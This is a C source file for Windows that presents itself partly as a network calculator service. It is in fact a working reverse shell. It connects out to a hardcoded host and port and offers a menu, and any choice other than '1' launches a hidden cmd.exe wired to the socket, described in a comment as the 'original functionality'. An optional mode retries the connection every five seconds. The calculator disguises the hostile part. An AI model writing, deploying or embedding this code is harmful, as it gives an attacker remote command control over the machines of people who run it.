#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
#define CLIENT_IP (char*)"192.168.1.10"
#define CLIENT_PORT (int)80
#endif
/* ================================================== */

// Calculator functions
double calculate_expression(char* expression) {
    double num1, num2;
    char op;
    if (sscanf(expression, "%lf %c %lf", &num1, &op, &num2) == 3) {
        switch(op) {
            case '+': return num1 + num2;
            case '-': return num1 - num2;
            case '*': return num1 * num2;
            case '/': 
                if (num2 != 0) return num1 / num2;
                else return 0;
            default: return 0;
        }
    }
    return 0;
}

void calculator_service(SOCKET sockt) {
    char buffer[1024];
    int bytes_received;
    
    const char* welcome_msg = "\n=== Calculator Service ===\r\n"
                             "Enter expressions like: 5 + 3\r\n"
                             "Supported operations: +, -, *, /\r\n"
                             "Type 'exit' to quit\r\n"
                             "> ";
    
    send(sockt, welcome_msg, strlen(welcome_msg), 0);
    
    while(1) {
        bytes_received = recv(sockt, buffer, sizeof(buffer)-1, 0);
        if (bytes_received <= 0) break;
        
        buffer[bytes_received] = '\0';
        
        // Remove newline characters
        char* newline = strchr(buffer, '\r');
        if (newline) *newline = '\0';
        newline = strchr(buffer, '\n');
        if (newline) *newline = '\0';
        
        if (strcmp(buffer, "exit") == 0) {
            const char* exit_msg = "Calculator service exiting.\r\n";
            send(sockt, exit_msg, strlen(exit_msg), 0);
            break;
        }
        
        // Calculate result
        double result = calculate_expression(buffer);
        
        // Send result back
        char result_msg[256];
        if (strstr(buffer, "/ 0") != NULL) {
            snprintf(result_msg, sizeof(result_msg), "Error: Division by zero!\r\n> ");
        } else {
            snprintf(result_msg, sizeof(result_msg), "Result: %.2f\r\n> ", result);
        }
        send(sockt, result_msg, strlen(result_msg), 0);
    }
}

int main(void) {
    if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
        write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
        return (1);
    }

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
        write(2, "[ERROR] WSASturtup failed.\n", 27);
        return (1);
    }

    int port = CLIENT_PORT;
    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
    while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
        Sleep(5000);
    }
#else
    if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
        write(2, "[ERROR] connect failed.\n", 24);
        return (1);
    }
#endif

    // Choose between calculator service or command shell
    const char* menu = "Choose service:\r\n1. Calculator\r\n2. Command Shell\r\nEnter choice: ";
    send(sockt, menu, strlen(menu), 0);
    
    char choice[10];
    int bytes_received = recv(sockt, choice, sizeof(choice)-1, 0);
    if (bytes_received > 0) {
        choice[bytes_received] = '\0';
        
        if (choice[0] == '1') {
            // Run calculator service
            calculator_service(sockt);
        } else {
            // Run command shell (original functionality)
            STARTUPINFO sinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES);
            sinfo.hStdInput = (HANDLE)sockt;
            sinfo.hStdOutput = (HANDLE)sockt;
            sinfo.hStdError = (HANDLE)sockt;
            PROCESS_INFORMATION pinfo;
            CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
            
            // Wait for the process to finish
            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
    }

    closesocket(sockt);
    WSACleanup();
    return (0);
}
